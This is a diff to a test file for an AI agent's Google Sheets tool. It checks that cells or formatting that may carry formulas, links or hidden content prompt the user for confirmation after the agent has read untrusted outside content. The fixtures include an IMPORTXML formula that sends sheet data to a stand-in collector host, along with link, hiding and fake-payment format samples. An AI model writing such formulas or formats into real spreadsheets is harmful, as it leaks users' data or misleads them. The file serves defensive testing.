@@ -57,6 +57,8 @@ const FETCHING = '=IMPORTXML("https://collect.example/p?d="&A1, "//a")';
 const WRITTEN = { ok: true, json: async () => ({ updatedRange: 'Sheet1!B2:C3', updatedRows: 2, updatedColumns: 2, updatedCells: 4 }) };
 const APPENDED = { ok: true, json: async () => ({ updates: { updatedRange: 'Sheet1!A9:B9', updatedRows: 1, updatedCells: 2 } }) };
 
+/** Said wherever a question shows a formula: the functions are examples, and the address may be built. */
+const FETCHES = 'A formula can make Google fetch an address and send data from the sheet with it: functions such as IMPORTXML, IMPORTHTML, IMPORTDATA, IMPORTFEED, IMPORTRANGE and IMAGE do, and other functions can too. The address need not be written out, since a formula can build it from other cells.';
 const HIDDEN = 'Writing as formulas is offered only when every formula is shown here. To write them as formulas, ask in the chat to write at most 5 at a time.';
 const PLAIN_WRITE_QUESTION = 'Overwrite range "Sheet1!B2:C3" in spreadsheet sid? This will replace existing data.';
 
@@ -118,7 +120,7 @@ describe('google_sheets after content from outside the chat', () => {
     expect(flattenPrompt(prompt)).toBe([
       PLAIN_WRITE_QUESTION,
       '',
-      'This chat has read content from outside lynox, such as a web page, an email or a file. 2 of these cells start like a formula, and Google runs a formula when it is written. A formula can make Google fetch an address named in it, with data from the sheet in that address.',
+      `This chat has read content from outside lynox, such as a web page, an email or a file. 2 of these cells start like a formula, and Google runs a formula when it is written. ${FETCHES}`,
       `C2: ${FETCHING}`,
       'B3: =B2',
     ].join('\n'));
@@ -270,7 +272,7 @@ describe('google_sheets format after content from outside the chat', () => {
   beforeEach(() => { vi.clearAllMocks(); });
 
   const PLAIN_FORMAT_QUESTION = 'Apply batch changes to spreadsheet sid? Formatting requests can delete or overwrite cells and sheets.';
-  const NOTE_ONE = 'This chat has read content from outside lynox, such as a web page, an email or a file. 1 of these requests can write cell content or a rule, which can hold a formula, and Google runs a formula on its side. A formula can make Google fetch an address named in it, with data from the sheet in that address. It is shown here in full:';
+  const NOTE_ONE = `This chat has read content from outside lynox, such as a web page, an email or a file. 1 of these requests can write cell content or a rule, or change what a cell reads as, such as a number pattern, a link, the text direction or hidden rows. Content and rules can hold a formula, and Google runs a formula on its side. ${FETCHES} It is shown here in full:`;
   const APPLIED = { ok: true, json: async () => ({ replies: [{}, {}] }) };
   const RANGE = { sheetId: 0, startRowIndex: 0, endRowIndex: 1 };
   const BORDERS = { updateBorders: { range: RANGE, top: { style: 'SOLID' } } };
@@ -343,6 +345,9 @@ describe('google_sheets format after content from outside the chat', () => {
   it.each([
     ['borders', [BORDERS]],
     ['a format-only repeatCell', [BOLD]],
+    ['the whole cell format with only a background in the cell', [{ repeatCell: { range: RANGE, cell: { userEnteredFormat: { backgroundColor: { red: 1 } } }, fields: 'userEnteredFormat' } }]],
+    ['the whole text format in a group with only bold in the cell', [{ repeatCell: { range: RANGE, cell: { userEnteredFormat: { textFormat: { bold: true } } }, fields: 'userEnteredFormat(backgroundColor,textFormat)' } }]],
+    ['a mask nested exactly as deep as it is read', [{ repeatCell: { range: RANGE, cell: { userEnteredFormat: {} }, fields: `userEnteredFormat${'(backgroundColor'.repeat(8)}${')'.repeat(8)}` } }]],
     ['a grouped format mask', [{ repeatCell: { range: RANGE, cell: { userEnteredFormat: {} }, fields: 'userEnteredFormat(backgroundColor,textFormat(bold,italic)), userEnteredFormat.wrapStrategy' } }]],
     ['merges, sizes and bands', [{ mergeCells: { range: RANGE, mergeType: 'MERGE_ALL' } }, { unmergeCells: { range: RANGE } }, { updateDimensionProperties: { range: { sheetId: 0, dimension: 'ROWS' }, properties: { pixelSize: 30 }, fields: 'pixelSize' } }, { autoResizeDimensions: { dimensions: { sheetId: 0, dimension: 'COLUMNS' } } }, { addBanding: { bandedRange: { range: RANGE } } }, { updateBanding: { bandedRange: { bandedRangeId: 1 }, fields: 'rowProperties' } }, { deleteBanding: { bandedRangeId: 1 } }]],
   ])('asks as always for %s', async (_label, requests) => {
@@ -360,8 +365,9 @@ describe('google_sheets format after content from outside the chat', () => {
     ['a pattern path', fmt('userEnteredFormat.numberFormat.pattern', { numberFormat: { pattern: ';;;' } })],
     ['a link path', fmt('userEnteredFormat.textFormat.link', { textFormat: { link: { uri: 'https://collect.example/' } } })],
     ['the whole text format', fmt('userEnteredFormat.textFormat', { textFormat: { link: { uri: 'https://collect.example/' } } })],
-    ['the whole text format in a group', fmt('userEnteredFormat(textFormat)', { textFormat: { bold: true } })],
-    ['the whole cell format', fmt('userEnteredFormat', { backgroundColor: { red: 1 } })],
+    ['a link under the whole cell format', fmt('userEnteredFormat', { backgroundColor: { red: 1 }, textFormat: { link: { uri: 'https://collect.example/' } } })],
+    ['a number format under the whole cell format', fmt('userEnteredFormat', { numberFormat: { type: 'TEXT', pattern: '"Pay to CH93 0076"' } })],
+    ['a mask for every field', fmt('*', { backgroundColor: { red: 1 } })],
     ['a link display', fmt('userEnteredFormat.hyperlinkDisplayType', { hyperlinkDisplayType: 'LINKED' })],
     ['a text direction', fmt('userEnteredFormat.textDirection', { textDirection: 'RIGHT_TO_LEFT' })],
     ['a link in the cell beside a narrow mask', fmt('userEnteredFormat.backgroundColor', { backgroundColor: { red: 1 }, textFormat: { link: { uri: 'https://collect.example/' } } })],
@@ -378,11 +384,11 @@ describe('google_sheets format after content from outside the chat', () => {
     expect(flattenPrompt(asked(a).prompt)).toContain(NOTE_ONE);
   });
 
-  /** An updateCells request whose shown line is exactly `length` characters. */
-  function cellsOfLine(length: number): unknown {
+  /** An updateCells request whose line, before `tail`, is exactly `length` plain characters. */
+  function cellsOfLine(length: number, tail = ''): unknown {
     const body = (pad: string) => ({ range: RANGE, rows: [{ values: [{ userEnteredValue: { formulaValue: `${FETCHING}${pad}` } }] }], fields: 'userEnteredValue' });
     const base = `updateCells: ${JSON.stringify(body(''))}`.length;
-    return { updateCells: body('p'.repeat(length - base)) };
+    return { updateCells: body('p'.repeat(length - base) + tail) };
   }
 
   it('asks with a request whose line is exactly the longest a question shows', async () => {
@@ -398,6 +404,23 @@ describe('google_sheets format after content from outside the chat', () => {
     expect(result).toContain('Split it');
     expect(a.promptUser).not.toHaveBeenCalled();
     expect(mockFetch).not.toHaveBeenCalled();
+  });
+
+  it('counts a line by its characters as shown, not by UTF-16 units', async () => {
+    const a = agent('sawUntrustedData', 'No');
+    const wide = String.fromCodePoint(0x1f600);
+    const request = cellsOfLine(FORMAT_LINE_MAX - 10, wide.repeat(10)) as { updateCells: unknown };
+    await createSheetsTool(auth).handler({ action: 'format', spreadsheet_id: 'sid', format_requests: [request] }, a);
+    const line = flattenPrompt(asked(a).prompt).split('\n').at(-1)!;
+    expect([...line]).toHaveLength(FORMAT_LINE_MAX);
+    expect(line.length).toBeGreaterThan(FORMAT_LINE_MAX);
+  });
+
+  it('counts an unseen character by its escape, so it can push a line past what a question shows', async () => {
+    const a = agent('sawUntrustedData', 'Yes');
+    const result = await createSheetsTool(auth).handler({ action: 'format', spreadsheet_id: 'sid', format_requests: [cellsOfLine(FORMAT_LINE_MAX - 1, String.fromCharCode(0x200b))] }, a);
+    expect(result).toContain('Split it');
+    expect(a.promptUser).not.toHaveBeenCalled();
   });
 
   it('asks with as many requests that write cells as a question shows', async () => {
